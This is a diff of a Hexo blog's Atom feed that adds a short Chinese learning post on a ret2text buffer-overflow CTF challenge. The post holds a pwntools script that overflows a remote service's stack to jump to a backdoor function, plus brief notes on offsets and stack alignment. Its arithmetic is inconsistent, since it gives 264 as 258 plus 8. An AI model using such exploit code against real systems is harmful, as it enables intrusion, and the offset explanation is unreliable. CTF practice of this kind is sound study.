@@ -6,7 +6,7 @@
   <link href="https://jiutian521.github.io/atom.xml" rel="self"/>
   
   <link href="https://jiutian521.github.io/"/>
-  <updated>2025-11-02T09:57:23.131Z</updated>
+  <updated>2025-11-04T09:37:07.172Z</updated>
   <id>https://jiutian521.github.io/</id>
   
   <author>
@@ -15,6 +15,26 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title></title>
+    <link href="https://jiutian521.github.io/posts/0.html"/>
+    <id>https://jiutian521.github.io/posts/0.html</id>
+    <published>2025-11-02T13:33:09.046Z</published>
+    <updated>2025-11-04T09:37:07.172Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="用gdb的动态视角看ret2text的实现"><a href="#用gdb的动态视角看ret2text的实现" class="headerlink" title="用gdb的动态视角看ret2text的实现"></a>用gdb的动态视角看ret2text的实现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote(&quot;39.106.48.123&quot;, 29826)</span><br><span class="line"></span><br><span class="line">payload = b&quot;A&quot;*264 + p64(0x401202)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>264即258+8，258是rbp的位置，ida里一般是16位，0x401202为后门函数入栈的地址</p><p>注意：1.一定不要忘记加8个字节 2.如果不成功，可能是栈没有对齐，需要把后门函数的地址往后加两个单位</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;用gdb的动态视角看ret2text的实现&quot;&gt;&lt;a href=&quot;#用gdb的动态视角看ret2text的实现&quot; class=&quot;headerlink&quot; title=&quot;用gdb的动态视角看ret2text的实现&quot;&gt;&lt;/a&gt;用gdb的动态视角看ret2text的实现&lt;/</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>梦开始的地方</title>
